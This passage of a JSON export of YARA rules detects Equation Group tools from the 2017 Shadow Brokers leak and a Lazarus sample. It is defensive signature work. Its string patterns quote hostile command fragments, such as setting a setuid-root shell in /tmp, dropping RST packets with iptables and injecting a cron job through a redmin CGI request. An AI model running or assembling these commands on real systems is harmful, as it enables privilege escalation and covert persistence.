Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17__NameProbe_SMBTOUCH_14_RID3956","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"444337a634db7cbdb2c185b71f789daa","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RPC2_15_RID3890 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:26:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"** SendAndReceive ** - EXCEPTION_EXECUTE_HANDLER\" fullword ascii\n      $s8 = \"Binding to RPC Interface %s over named pipe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them )\n}","date":"2017-04-15 18:26:31","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RPC2_15_RID3890","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"586a226b96bf1cfdd61aee4d27bfaf4a","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_16_RID371B : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:24:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ERROR: TbMalloc() failed for encoded exploit payload\" fullword ascii\n      $x2 = \"** EncodeExploitPayload ** - EXCEPTION_EXECUTE_HANDLER\" fullword ascii\n      $x4 = \"** RunExploit ** - EXCEPTION_EXECUTE_HANDLER\" fullword ascii\n      $s6 = \"Sending Implant Payload (%d-bytes)\" fullword ascii\n      $s7 = \"ERROR: Encoder failed on exploit payload\" fullword ascii\n      $s11 = \"ERROR: VulnerableOS() != RET_SUCCESS\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them )\n}","date":"2017-04-15 17:24:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_16_RID371B","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"d12b8b4afa30981ed48601ffe5806d39","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17__ETBL_ETRE_SMBTOUCH_17_RID3896 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:27:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ERROR: Connection terminated by Target (TCP Ack/Fin)\" fullword ascii\n      $s2 = \"Target did not respond within specified amount of time\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )\n}","date":"2017-04-15 18:27:31","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17__ETBL_ETRE_SMBTOUCH_17_RID3896","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"792d2698751621181755648da1501c48","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Enigma_Protector_LazarusSample_RID3326 : APT DEMO EXE FILE T1045 {\n   meta:\n      description = \"Detects malware packed with the Enigma protector\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/sas/77908/lazarus-under-the-hood/\"\n      date = \"2017-04-12 14:35:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1045\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 5d 5d 5d aa bf 5e 95 d6 dc 51 5d 5d 5d 5e 98 0d } \n      $op2 = { 52 d9 47 5d 5d 5d dd a6 b4 52 d9 4c 5d 5d 5d 3b } \n      $op3 = { 9f 59 14 52 d8 a9 a2 a2 a2 00 9f 51 5d d6 d1 79 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}","date":"2017-04-12 14:35:31","description":"Detects malware packed with the Enigma protector","minimum_yara":"1.7","name":"Enigma_Protector_LazarusSample_RID3326","reference":"https://securelist.com/blog/sas/77908/lazarus-under-the-hood/","required_modules":[],"rule_hash":"e02b5b66e3b73fc6764e4db2fa3251b6","score":60,"tags":["APT","DEMO","EXE","T1045","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_tmpwatch_RID302B : APT DEMO {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 12:28:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"chown root:root /tmp/.scsi/dev/bin/gsh\" fullword ascii\n      $s2 = \"chmod 4777 /tmp/.scsi/dev/bin/gsh\" fullword ascii\n   condition: \n      ( filesize < 1KB and 1 of them )\n}","date":"2017-04-09 12:28:21","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_tmpwatch_RID302B","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"3d6a97619461d7b9be09c02e73a8b28f","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule EquationGroup_gr_RID2D9C : APT DEMO {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 10:39:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if [ -f /tmp/tmpwatch ] ; then\" fullword ascii\n      $s2 = \"echo \\\"bailing. try a different name\\\"\" fullword ascii\n   condition: \n      ( filesize < 1KB and all of them )\n}","date":"2017-04-09 10:39:11","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_gr_RID2D9C","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"26ccd5b38b31f1edd893fa066255bf17","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule EquationGroup_store_linux_i386_v_3_3_0_RID3570 : APT DEMO FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:13:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[-] Failed to map file: %s\" fullword ascii\n      $s2 = \"[-] can not NULL terminate input data\" fullword ascii\n      $s3 = \"[!] Name has size of 0!\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 60KB and all of them )\n}","date":"2017-04-09 16:13:11","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_store_linux_i386_v_3_3_0_RID3570","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"c153ec3d1a475d0f6b6976a3ee73784e","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_morerats_client_genkey_RID35F0 : APT DEMO {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:34:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"rsakey_txt = lo_execute('openssl genrsa 2048 2> /dev/null | openssl rsa -text 2> /dev/null')\" fullword ascii\n      $x2 = \"client_auth = binascii.hexlify(lo_execute('openssl rand 16'))\" fullword ascii\n   condition: \n      ( filesize < 3KB and all of them )\n}","date":"2017-04-09 16:34:31","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_morerats_client_genkey_RID35F0","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"f42866361bc2d986afe6f246eee3042b","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule EquationGroup_cursetingle_2_0_1_2_mswin32_v_2_0_1_RID3920 : APT DEMO EXE FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 18:50:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[%.2u%.2u%.2u%.2u%.2u%.2u]\" fullword ascii\n      $s2 = \"0123456789abcdefABCEDF:\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-04-09 18:50:31","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_cursetingle_2_0_1_2_mswin32_v_2_0_1_RID3920","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"aaf262f720218a8cb5363f36344728cb","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_cursesleepy_mswin32_v_1_0_0_RID36EC : APT DEMO EXE FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 17:16:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"A}%j,R\" fullword ascii\n      $op1 = { a1 e0 43 41 00 8b 0d 34 44 41 00 6b c0 } \n      $op2 = { 33 C0 F3 A6 74 14 8B 5D 08 8B 4B 34 50 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )\n}","date":"2017-04-09 17:16:31","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_cursesleepy_mswin32_v_1_0_0_RID36EC","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"8c5ba6f57696417ee0d74db26ef7ff39","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_cursehelper_win2k_i686_v_2_2_0_RID37A1 : APT DEMO EXE FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 17:46:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/{}\" fullword ascii\n      $op1 = { 8d b5 48 ff ff ff 89 34 24 e8 56 2a 00 00 c7 44 } \n      $op2 = { e9 a2 f2 ff ff ff 85 b4 fe ff ff 8b 95 a8 fe ff } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )\n}","date":"2017-04-09 17:46:41","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_cursehelper_win2k_i686_v_2_2_0_RID37A1","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"ff4c0083ead631aedde343b1bfc37034","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_morerats_client_addkey_RID35DF : APT DEMO {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:31:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"print '  -s storebin  use storebin as the Store executable\\\\n'\" fullword ascii\n      $x2 = \"os.system('%s --file=\\\"%s\\\" --wipe > /dev/null' % (storebin, b))\" fullword ascii\n      $x3 = \"print '  -k keyfile   the key text file to inject'\" fullword ascii\n   condition: \n      ( filesize < 20KB and 1 of them )\n}","date":"2017-04-09 16:31:41","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_morerats_client_addkey_RID35DF","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"84c7fd5a7b6c532f41241b344cbc3360","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule EquationGroup_noclient_3_3_2_RID31D4 : APT DEMO {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 13:39:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"127.0.0.1 is not advisable as a source. Use -l 127.0.0.1 to override this warning\" fullword ascii\n      $x2 = \"iptables -%c OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;\" fullword ascii\n      $x3 = \"noclient: failed to execute %s: %s\" fullword ascii\n      $x4 = \"sh -c \\\"ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx \\\"\" fullword ascii\n      $s5 = \"Attempting connection from 0.0.0.0:\" ascii\n   condition: \n      ( filesize < 1000KB and 1 of them )\n}","date":"2017-04-09 13:39:11","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_noclient_3_3_2_RID31D4","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"c3d6229208c857cc91c8b8491cd62f87","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule EquationGroup_curseflower_mswin32_v_1_0_0_RID36E9 : APT DEMO EXE FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 17:16:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<pVt,<et(<st$<ct$<nt\" fullword ascii\n      $op1 = { 6a 04 83 c0 08 6a 01 50 e8 10 34 00 00 83 c4 10 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-04-09 17:16:01","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_curseflower_mswin32_v_1_0_0_RID36E9","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"f6115a74ada4c081b30d897cba74fee0","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_orleans_stride_sunos5_9_v_2_4_0_RID388D : APT DEMO FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 18:26:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"_lib_version\" fullword ascii\n      $s2 = \",%02d%03d\" fullword ascii\n      $s3 = \"TRANSIT\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them )\n}","date":"2017-04-09 18:26:01","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_orleans_stride_sunos5_9_v_2_4_0_RID388D","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"8d63f5732f2c17d353cd95bacfc48abc","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_morerats_client_noprep_RID3601 : APT DEMO {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:37:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"storestr = 'echo -n \\\"%s\\\" | Store --nullterminate --file=\\\"%s\\\" --set=\\\"%s\\\"' % (nopenargs, outfile, VAR_NAME)\" fullword ascii\n      $x2 = \"The NOPEN-args provided are injected into infile if it is a valid\" fullword ascii\n      $x3 = \" -i                do not autokill after 5 hours\" fullword ascii\n   condition: \n      ( filesize < 9KB and 1 of them )\n}","date":"2017-04-09 16:37:21","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_morerats_client_noprep_RID3601","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"95d1c61589cd0923e0daadf9541423bc","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule EquationGroup_cursezinger_linuxrh7_3_v_2_0_0_RID382A : APT DEMO FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 18:09:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \",%02d%03d\" fullword ascii\n      $s2 = \"[%.2u%.2u%.2u%.2u%.2u%.2u]\" fullword ascii\n      $s3 = \"__strtoll_internal\" fullword ascii\n      $s4 = \"__strtoul_internal\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 400KB and all of them )\n}","date":"2017-04-09 18:09:31","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_cursezinger_linuxrh7_3_v_2_0_0_RID382A","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"c56b59b03c5c664e6dbbd3d1c214afe0","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_seconddate_ImplantStandalone_3_0_3_RID39CD : APT DEMO FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 19:19:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"EFDGHIJKLMNOPQRSUT\" fullword ascii\n      $s2 = \"G8HcJ HcF LcF0LcN\" fullword ascii\n      $s3 = \"GhHcJ0HcF@LcF0LcN8H\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 1000KB and all of them )\n}","date":"2017-04-09 19:19:21","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_seconddate_ImplantStandalone_3_0_3_RID39CD","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"04da62c78e20c155b8d1d88121d6e47c","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_watcher_solaris_i386_v_3_3_0_RID36FE : APT DEMO FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 17:19:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"getexecname\" fullword ascii\n      $s2 = \"invalid option `\" fullword ascii\n      $s6 = \"__fpstart\" fullword ascii\n      $s12 = \"GHFIJKLMNOPQRSTUVXW\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 700KB and all of them )\n}","date":"2017-04-09 17:19:31","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_watcher_solaris_i386_v_3_3_0_RID36FE","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"cb8b0bd788e50f787da569d7cc47c7bf","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_gr_dev_bin_now_RID3285 : APT DEMO {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 14:08:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"HTTP_REFERER=\\\"https://127.0.0.1:6655/cgi/redmin?op=cron&action=once\\\"\" fullword ascii\n      $x2 = \"exec /usr/share/redmin/cgi/redmin\" fullword ascii\n   condition: \n      ( filesize < 1KB and 1 of them )\n}","date":"2017-04-09 14:08:41","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_gr_dev_bin_now_RID3285","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"74cec48099854ebea1f8cf4c938ebb0b","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule EquationGroup_gr_dev_bin_post_RID32F7 : APT DEMO {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 14:27:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"op=cron&action=once&frame=cronOnceFrame&cronK=cronV&cronCommand=%2Ftmp%2Ftmpwatch&time=12%3A12+01%2F28%2F2005\" ascii\n   condition: \n      ( filesize < 1KB and all of them )\n}","date":"2017-04-09 14:27:41","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_gr_dev_bin_post_RID32F7","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"f92fa0540f27bfd1295bc740883e8240","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule EquationGroup_curseyo_win2k_v_1_0_0_RID349A : APT DEMO EXE FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 15:37:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"0123456789abcdefABCEDF:\" fullword ascii\n      $op0 = { c6 06 5b 8b bd 70 ff ff ff 8b 9d 64 ff ff ff 0f } \n      $op1 = { 55 b8 ff ff ff ff 89 e5 83 ec 28 89 7d fc 8b 7d } \n      $op2 = { ff 05 10 64 41 00 89 34 24 e8 df 1e 00 00 e9 31 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-04-09 15:37:31","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_curseyo_win2k_v_1_0_0_RID349A","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"40a532a12356e2b7f6bfe0b64d516b57","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_curseroot_win2k_v_2_1_0_RID3578 : APT DEMO EXE FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:14:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s\" fullword ascii\n      $op0 = { c7 44 24 04 ff ff ff ff 89 04 24 e8 46 65 01 00 } \n      $op1 = { 8d 5d 88 89 1c 24 e8 24 1b 01 00 be ff ff ff ff } \n      $op2 = { d3 e0 48 e9 0c ff ff ff 8b 45 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and $s1 and 2 of ( $op* ) )\n}","date":"2017-04-09 16:14:31","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_curseroot_win2k_v_2_1_0_RID3578","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"02abf0e8135cb95419905d16e5679979","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_cursewham_curserazor_cursezinger_curseroot_win2k_RID40E0 : APT DEMO EXE FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 00:21:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s\" fullword ascii\n      $s3 = \",%02d%03d\" fullword ascii\n      $s4 = \"[%.2u%.2u%.2u%.2u%.2u%.2u]\" fullword ascii\n      $op1 = { 7d ec 8d 74 3f 01 0f af f7 c1 c6 05 } \n      $op2 = { 29 f1 89 fb d3 eb 89 f1 d3 e7 } \n      $op3 = { 7d e4 8d 5c 3f 01 0f af df c1 c3 05 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of them )\n}","date":"2017-04-09 00:21:11","description":"Equation Group hack tool 